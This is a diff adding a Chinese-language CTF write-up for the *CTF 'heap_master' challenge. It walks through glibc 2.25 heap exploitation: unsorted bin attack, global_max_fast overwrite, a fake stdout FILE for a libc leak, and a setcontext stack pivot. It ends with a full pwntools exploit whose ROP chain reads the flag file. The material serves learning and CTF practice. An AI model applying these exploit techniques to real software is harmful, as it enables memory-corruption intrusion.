@@ -832,4 +832,458 @@ pwndbg> find 0xffffffff81459000, 0xffffffff81c00000, 0xffffffffc000
   - [tty_struct](https://balsn.tw/ctf_writeup/20190427-*ctf/#hack_me)
   - [userfault_fd](http://brieflyx.me/2020/linux-tools/userfaultfd-internals/)
 
-P.S. 作者說題目出爛了，應該要有 index boundary checking 的，所以有 hackme_revenge
+P.S. 作者說題目出爛了，應該要有 index boundary checking 的，所以有 **hackme_revenge**
+
+
+
+### heap_master
+
+```
+// file
+./heap_master: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3b9b2fb172a175612c820c4de66a666d6ed0eed6, not stripped
+
+// checksec
+[*] '/home/u1f383/tmp/pwn/pwn-heap_master/env/share/heap_master'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+```
+
+glibc 版本為 2.25。
+
+
+
+程式流程十分簡單，首先會建立一塊範圍在 0x10000 ~ 0xFFFFF000 的 0x10000 大小的空間，稱做 `heap_base`，之後有三個功能
+
+- 任意 free `heap_base + offset`
+- 任意寫 `heap_offset`
+- 任意 `malloc()`
+
+由於沒有 output function，因此需要竄改 stdout 的 `write_ptr` 來 leak libc，而在 glibc 2.25 仍可以使用 **unsorted bin attack** 在指定位置寫入 chunk bin 的 address，步驟為:
+
+1. `a = malloc(0x410)` - 大小只需要能在 free 之後進入 unsorted bin 即可
+2. `malloc(0x10)` - 防止 consolidation
+3. `a->bk = target_addr - 0x10` - 將第一次 `malloc()` 得到的 chunk bk 改成目標 - 0x10
+4. `malloc(0x410)` - 申請與第一次 `malloc()` 時大小相同的 chunk
+
+以下為 unsorted bin attack 關鍵的程式碼:
+
+```c
+// malloc/malloc.c
+static void *
+_int_malloc (mstate av, size_t bytes)
+{
+    ...
+for (;; )
+    {
+      int iters = 0;
+      while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
+        {
+        bck = victim->bk; // <----- bk == target address - 0x10
+        ...
+		/* remove from unsorted list */
+          unsorted_chunks (av)->bk = bck;
+          bck->fd = unsorted_chunks (av); // <----- 更改了 target address 的 value
+
+          /* Take now instead of binning if exact fit */
+
+          if (size == nb)
+            {
+              set_inuse_bit_at_offset (victim, size);
+              if (av != &main_arena)
+				set_non_main_arena (victim);
+              check_malloced_chunk (av, victim, nb);
+              void *p = chunk2mem (victim);
+              alloc_perturb (p, bytes);
+              return p;
+            }
+	...
+```
+
+當 `malloc()` 的大小不屬於 fastbin 以及 smallbin，會進入此段程式碼。而程式碼的主要邏輯為，從 unsorted bin 中找尋是否有大小相同的 chunk 可以直接使用，如果有的話就會 return 給 user，而其中會順便清理 unsorted bin，將該歸位到 smallbin 或是 largebin 的 chunk 整理好。不過在更新 unsorted bin 的 linked list 時，沒有特別對 pointer 做檢查，因此如果我們能更動 `victim->bk`，這樣就能在執行 `bck->fd = unsorted_chunks (av);` 時寫入 `bck->fd == victim->bk->fd` unsorted bin 的 address。
+
+而此題的 unsorted bin address 與 `_IO_2_1_stdout_` 只有末 2 bytes 有差別，因此只要 partial overwrite 原本的 freed chunk 的 bk，就有 1/16 的機率可以猜到 `_IO_2_1_stdout_->_IO_write_ptr` 的位置並做改寫。然而，由於 `new_do_write` 中的判斷式 `  else if (fp->_IO_read_end != fp->_IO_write_base)` 成立時會直接 return，所以沒辦法 leak libc。
+
+```c
+static
+_IO_size_t
+new_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)
+{
+  _IO_size_t count;
+  if (fp->_flags & _IO_IS_APPENDING)
+    /* On a system without a proper O_APPEND implementation,
+       you would need to sys_seek(0, SEEK_END) here, but is
+       not needed nor desirable for Unix- or Posix-like systems.
+       Instead, just indicate that offset (before and after) is
+       unpredictable. */
+    fp->_offset = _IO_pos_BAD;
+  else if (fp->_IO_read_end != fp->_IO_write_base) // <---- match this condition and return
+    {
+      _IO_off64_t new_pos
+	= _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
+      if (new_pos == _IO_pos_BAD)
+	return 0;
+      fp->_offset = new_pos;
+    }
+  count = _IO_SYSWRITE (fp, data, to_do);
+```
+
+
+
+在此情況下，是否能透過改變 `stdout` 指向我們能控制的 fake `_IO_2_1_stdout_`?
+
+**以下參考 [balsn writeup](https://balsn.tw/ctf_writeup/20190427-*ctf/#heap-master)**
+
+
+
+建構 fake `_IO_2_1_stdout_` 前，由於 member 會有多個 libc address，因此利用構造多個 fake chunk of smallbin，並且 `free` 完後會有 smallbin 的 address，這樣就能有 libc address 來構造 fake `_IO_2_1_stdout_`:
+
+```python
+for i in range(0xe):
+    edit(0xf8 + i*0x10, p64(0x201))
+for i in range(0x10):
+    edit(0x2f8 + i*0x10, p64(0x21))
+for i in range(0xd):
+    free(0x1d0-i*0x10)
+    malloc(0x1f0)
+```
+
+這邊要 `malloc()` 的原因在於，chunk 必須從 smallbin 中取走，不然 smallbin 的 chunk 串起來時 chunk 的 fd 或 bk 會變成 `mmap()` address，並且做 `unlink` 時會因為 `prev_size` (0x200) 不等於 `chunksize(P)` (0x20) 而壞掉:
+
+```c
+static void
+_int_free (mstate av, mchunkptr p, int have_lock)
+{
+    ...
+	if (nextchunk != av->top) {
+      /* get and clear inuse bit */
+      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);
+
+      /* consolidate forward */
+      if (!nextinuse) {
+		unlink(av, nextchunk, bck, fwd);
+		size += nextsize;
+      } 
+     ...
+}
+
+/* Take a chunk off a bin list */
+#define unlink(AV, P, BK, FD) {                                            \
+    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
+      malloc_printerr (check_action, "corrupted size vs. prev_size", P, AV);  \
+    FD = P->fd;								      \
+    BK = P->bk;
+```
+
+P.S. glibc 2.25 source code 並沒有這段檢查，至少要在 glibc 2.26 才會有，不過官方提供的 library 是有這個檢查機制的
+
+到這邊， `heap_base + 0x100` 開始即是 fake `_IO_2_1_stdout_` 的起頭，除了 `write` 相關的 pointer 以及 flag，其他都與 `_IO_2_1_stdout_` 相同。下一步要修改用來定義 fastbin size 的 `global_max_fast`，由於 fastbinsY 的大小只有 `NFASTBINS` (10)，而在 `global_max_fast` 被更動的情況下，如果 size 超過 `MAX_FAST_SIZE` 的 chunk 其 address 會直接往後蓋，因此可以覆蓋任何 `fastbinsY` 以後的 address 成自己的 pointer，而與 `fastbinsY` 的 offset 為 `(target - fastbinY) * 2 + 0x10` (因為 size 每 0x10 會佔一個 bin)，因此可以透過此方式改寫 `stdout` variable，讓他指向我們的 fake `_IO_2_1_stdout_`。 
+(修改 `MAX_FAST_SIZE` 在 glibc 2.31 已經沒辦法 work)
+
+主要更動的地方只有 `write_base` 以及 `_flags | _IO_IS_APPENDING`，讓 `new_do_write` 時先進入 `if (fp->_flags & _IO_IS_APPENDING)` 此 condition 即可:
+
+```python
+# fake _IO_2_1_stdout_ start from heap_base + 0x100
+edit(0x100, p32(0xfbad3887)) # _flags == 0xfbad2887 | _IO_IS_APPENDING
+edit(0x108, p64(0)) # read_ptr
+edit(0x110, p64(0)) # read_end
+edit(0x110, p64(0)) # read_base
+edit(0x120, p16(0xc610)) # write_base (stdout + 0x10)
+edit(0x128, p16(0xc683)) # write_ptr
+edit(0x130, p16(0xc683)) # write_end
+edit(0x138, p16(0xc683)) # buf_base
+edit(0x140, p16(0xc684)) # buf_end
+edit(0x148, p64(0)*4) # save_base, backup_base, save_end, markers
+edit(0x168, p16(0xb8c0)) # chain
+edit(0x170, p32(1)) # fileno
+edit(0x174, p32(0)) # _flags2
+edit(0x178, p64(2**64 - 1)) # _old_offset
+edit(0x180, p64(0)) # _cur_column _vtable_offset _shortbuf
+edit(0x188, p16(0xd760)) # _lock
+edit(0x190, p64(2**64 - 1)) # _offset
+edit(0x198, p64(0)) # _codecvt
+edit(0x1a0, p16(0xb780)) # _wide_data
+edit(0x1a8, p64(0) * 3) # _freeres_list, _freeres_buf, __pad5
+edit(0x1c0, p32(2**32 - 1)) # _mod
+edit(0x1c4, p32(0) + p64(0)*2) # _unused2
+edit(0x1d8, p16(0x8440)) # vtable
+```
+
+之後透過 `free()` chunk 就能 leak libc address。
+
+下一步繼續利用 fastbin chunk 來覆蓋掉特定 libc 位置，這次的目標為改寫 `_IO_list_all` 成另一個 fake `FILE`，目標是利用 `exit()` 時對每個 `FILE` 執行 `vtable->overflow`，而若此時 vtable 為 `_IO_str_jumps`，就能利用控制 `_IO_buf_end` 以及 `_allocate_buffer` (0xe0)，呼叫 `_IO_str_overflow` 來執行 `(_allocate_buffer) (_IO_buf_end)`:
+
+```c
+int
+_IO_str_overflow (_IO_FILE *fp, int c)
+{
+  ...
+	  if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
+		return EOF;
+      else
+	{
+	  char *new_buf;
+	  char *old_buf = fp->_IO_buf_base;
+	  size_t old_blen = _IO_blen (fp);
+	  _IO_size_t new_size = 2 * old_blen + 100;
+	  if (new_size < old_blen)
+	    return EOF;
+	  new_buf
+	    = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);
+     ...
+```
+
+而此時將 `_allocate_buffer` 設為 `setcontext+53`，就能控制 rsp + `push rcx ; ret`:
+
+```c
+<setcontext+53>:      mov    rsp,QWORD PTR [rdi+0xa0]
+<setcontext+60>:      mov    rbx,QWORD PTR [rdi+0x80]
+<setcontext+67>:      mov    rbp,QWORD PTR [rdi+0x78]
+<setcontext+71>:      mov    r12,QWORD PTR [rdi+0x48]
+<setcontext+75>:      mov    r13,QWORD PTR [rdi+0x50]
+<setcontext+79>:      mov    r14,QWORD PTR [rdi+0x58]
+<setcontext+83>:      mov    r15,QWORD PTR [rdi+0x60]
+<setcontext+87>:      mov    rcx,QWORD PTR [rdi+0xa8]
+<setcontext+94>:      push   rcx
+<setcontext+95>:      mov    rsi,QWORD PTR [rdi+0x70]
+<setcontext+99>:      mov    rdx,QWORD PTR [rdi+0x88]
+<setcontext+106>:     mov    rcx,QWORD PTR [rdi+0x98]
+<setcontext+113>:     mov    r8,QWORD PTR [rdi+0x28]
+<setcontext+117>:     mov    r9,QWORD PTR [rdi+0x30]
+<setcontext+121>:     mov    rdi,QWORD PTR [rdi+0x68]
+<setcontext+125>:     xor    eax,eax
+<setcontext+127>:     ret    
+```
+
+而如果要執行到能控制的 rop，`[rdi+0xa0]` 就必須為指定位置，這邊找了一個指向 `__default_morecore` 的 function pointer `__morecore`，並且將 `rdi` 傳入 `__morecore - 8 - 0xa0`，這邊 -8 的原因是因為 `mov rcx,QWORD PTR [rdi+0xa8] ; push rcx ; ret`。在 push 後會把 `__default_morecore` push 到 stack 上，並在最後值型，而這邊選 `__morecore` 的原因也是因為 `[rdi+0xa8]` 要是一個可執行 + 不會弄壞 stack 的 function。`__default_morecore` 雖然會執行 `sbrk` 會失敗，但是不會 crash，因此能在 `ret` 後執行 ROP:
+
+```c
+<__default_morecore>:         sub    rsp,0x8
+<__default_morecore+4>:       call   0x155555072500 <sbrk>
+<__default_morecore+9>:       mov    edx,0x0
+<__default_morecore+14>:      cmp    rax,0xffffffffffffffff
+<__default_morecore+18>:      cmove  rax,rdx
+<__default_morecore+22>:      add    rsp,0x8
+<__default_morecore+26>:      ret
+```
+
+而 ROP 一樣是透過 fastbin chunk 的方式改寫 `_morecore - 8` 為 `heap + 0x3000`，並在 `heap + 0x3000` 堆 ROP，最後就能順利執行 ROP chain。完整 exploit 如下:
+
+```python
+#!/usr/bin/python3
+
+from pwn import *
+
+context.arch = 'amd64'
+context.terminal = ['tmux', 'splitw', '-h']
+
+r = process("./H", env={"LD_PRELOAD": "./libc.so.6"}, aslr=False)
+gdb.attach(r, """
+c
+""")
+
+"""
+1. malloc
+2. edit
+3. free
+"""
+
+def malloc(sz):
+    r.sendlineafter('>> ', '1')
+    r.sendlineafter('size: ', str(sz))
+
+def edit(off, ct):
+    r.sendlineafter('>> ', '2')
+    r.sendlineafter('offset: ', str(off))
+    r.sendlineafter('size: ', str(len(ct)))
+    r.sendafter('content: ', ct)
+
+def free(off):
+    r.sendlineafter('>> ', '3')
+    r.sendlineafter('offset: ', str(off))
+
+global_max_fast_poff = 0xd7d0
+stdout_write_base_poff = 0xc610
+chk_sz = 0x420
+
+for i in range(0xe):
+    edit(0xf8 + i*0x10, p64(0x201))
+for i in range(0x10):
+    edit(0x2f8 + i*0x10, p64(0x21))
+for i in range(0xd):
+    free(0x1d0 - i*0x10)
+    malloc(0x1f0)
+
+"""
+0xfbad3c80 == _IO_IS_FILEBUF | _IO_IS_APPENDING --> 0x3000
+              _IO_TIED_PUT_GET | _IO_CURRENTLY_PUTTING --> 0xc00
+              _IO_LINKED --> 0x80
+0xfbad2887 == _IO_IS_FILEBUF --> 0x2000
+              _IO_CURRENTLY_PUTTING --> 0x800
+              _IO_LINKED --> 0x80
+              _IO_USER_BUF | _IO_UNBUFFERED | _IO_NO_READS --> 0x7
+"""
+# fake _IO_2_1_stdout_ start from heap_base + 0x100
+edit(0x100, p32(0xfbad3887)) # _flags == 0xfbad2887 | _IO_IS_APPENDING
+edit(0x108, p64(0)) # read_ptr
+edit(0x110, p64(0)) # read_end
+edit(0x110, p64(0)) # read_base
+edit(0x120, p16(0xc610)) # write_base (stdout + 0x10)
+edit(0x128, p16(0xc683)) # write_ptr
+edit(0x130, p16(0xc683)) # write_end
+edit(0x138, p16(0xc683)) # buf_base
+edit(0x140, p16(0xc684)) # buf_end
+edit(0x148, p64(0)*4) # save_base, backup_base, save_end, markers
+edit(0x168, p16(0xb8c0)) # chain
+edit(0x170, p32(1)) # fileno
+edit(0x174, p32(0)) # _flags2
+edit(0x178, p64(2**64 - 1)) # _old_offset
+edit(0x180, p64(0)) # _cur_column _vtable_offset _shortbuf
+edit(0x188, p16(0xd760)) # _lock
+edit(0x190, p64(2**64 - 1)) # _offset
+edit(0x198, p64(0)) # _codecvt
+edit(0x1a0, p16(0xb780)) # _wide_data
+edit(0x1a8, p64(0) * 3) # _freeres_list, _freeres_buf, __pad5
+edit(0x1c0, p32(2**32 - 1)) # _mod
+edit(0x1c4, p32(0) + p64(0)*2) # _unused2
+edit(0x1d8, p16(0x8440)) # vtable
+
+edit(0x1008, p64(0x91))
+edit(0x1098, p64(0x21))
+edit(0x10b8, p64(0x21))
+free(0x1010)
+edit(0x1018, p16(global_max_fast_poff - 0x10))
+malloc(0x80) # overwrite global_max_fast to a large value
+
+edit(0x108, p64(0x17e1)) # &stdout
+edit(0x18e8, p64(0x21))
+edit(0x1908, p64(0x21))
+free(0x110)
+libc = u64(r.recv(8)) - 0x39e683
+__morecore_8 = libc + 0x39e388
+_IO_str_jumps = libc + 0x39a080
+setcontext = libc + 0x43565 # offset 53
+info(f"""
+libc: {hex(libc)}
+fastbinsY: {hex(libc + 0x39db00)}
+""")
+
+edit(0x1008, p64(0x1411)) # &_IO_list_all
+edit(0x2418, p64(0x21))
+edit(0x2438, p64(0x21))
+free(0x1010)
+
+# call _IO_file_overflow -> (setcontext+53)(__morecore_8 - 0xa0)
+fake = b''.ljust(0x28, b'\x00')
+fake += p64(0xaaaabbbbccccdddd) # write_ptr
+fake = fake.ljust(0x40, b'\x00')
+fake += p64((__morecore_8 - 0xa0 - 100) // 2) # 0x40 ~ 0x48 buf_end --> __morecore_8 - 0xa0
+fake = fake.ljust(0xd8, b'\x00')
+fake += p64(_IO_str_jumps) # vtable
+fake += p64(setcontext) # _allocate_buffer
+edit(0x1000, fake)
+
+edit(0x2008, p64(0x1121)) # [__morecore_8] = heap_base + 0x2000
+edit(0x3128, p64(0x21))
+edit(0x3148, p64(0x21))
+free(0x2010)
+
+pop_rax_ret = libc + 0x36d98
+pop_rdi_ret = libc + 0x1feea
+pop_rsi_ret = libc + 0x1fe95
+pop_rdx_ret = libc + 0x1b92
+syscall_ret = libc + 0xaa6b5
+buf = libc + 0x39f000
+
+rop = flat([
+    # read(0, buf, 0x4)
+    pop_rax_ret, 0,
+    pop_rdi_ret, 0,
+    pop_rsi_ret, buf,
+    pop_rdx_ret, 0x4,
+    syscall_ret,
+
+    # open("flag", O_RDONLY)
+    pop_rax_ret, 2,
+    pop_rdi_ret, buf,
+    pop_rsi_ret, 0,
+    pop_rdx_ret, 0,
+    syscall_ret,
+
+    # read(0, buf, 0x30)
+    pop_rax_ret, 0,
+    pop_rdi_ret, 3,
+    pop_rsi_ret, buf,
+    pop_rdx_ret, 0x30,
+    syscall_ret,
+
+    # write(1, buf, 0x30)
+    pop_rax_ret, 1,
+    pop_rdi_ret, 1,
+    pop_rsi_ret, buf,
+    pop_rdx_ret, 0x30,
+    syscall_ret,
+])
+
+edit(0x2000, rop)
+r.sendline("A")
+sleep(0.1)
+r.send("flag")
+
+r.interactive()
+```
+
+
+
+- `setcontext()`:  The function setcontext() restores the **user context pointed at by ucp**
+  - ucp == `ucontext_t` pointer (?)
+
+
+
+---
+
+
+
+官方解法利用 largebin attack + 蓋 `stdout` 來 libc，但是過程基本上是一樣的，最後 exploit 的部分走 `_dl_open_hook` ，沒有仔細追，過程大致如下:
+
+`_int_free` -> `malloc_printerr` -> `__libc_message` -> `BEFORE_ABORT()` (`backtrace_and_maps()`) -> `__backtrace()` -> `__libc_once()` -> `INIT_FUNCTION()`(sysdeps/generic/libc-lock.h) 也就是 `init()` 被執行 -> (sysdeps/x86_64/backtrace.c) -> `__libc_dlopen()` (實際執行 `__libc_dlopen_mode()`) (elf/dl-libc.c):
+
+```c
+void *
+__libc_dlopen_mode (const char *name, int mode)
+{
+  struct do_dlopen_args args;
+  args.name = name;
+  args.mode = mode;
+  args.caller_dlopen = RETURN_ADDRESS (0);
+
+#ifdef SHARED
+  if (__glibc_unlikely (_dl_open_hook != NULL))
+    return _dl_open_hook->dlopen_mode (name, mode);
+...
+```
+
+and `__libc_dlsym()`:
+
+```c
+void *
+__libc_dlsym (void *map, const char *name)
+{
+  struct do_dlsym_args args;
+  args.map = map;
+  args.name = name;
+
+#ifdef SHARED
+  if (__glibc_unlikely (_dl_open_hook != NULL))
+    return _dl_open_hook->dlsym (map, name);
+...
+```
+
+control `rbx` (`[_dl_open_hook]`) 並執行 `call [rbx]`，也就是 `**_dl_open_hook`，如果能再配合 `call qword ptr [rbx + 0x40]` + `setcontext` 來 control RSP，一樣能 stack pivoting + ROP。
+
+
+
+- `repz ret`: repz is a prefix that **repeats the following instruction** until **some register is 0**. Also, it only works on string instructions; otherwise the behavior is undefined. So what on earth is gcc doing generating a repz retq?
+
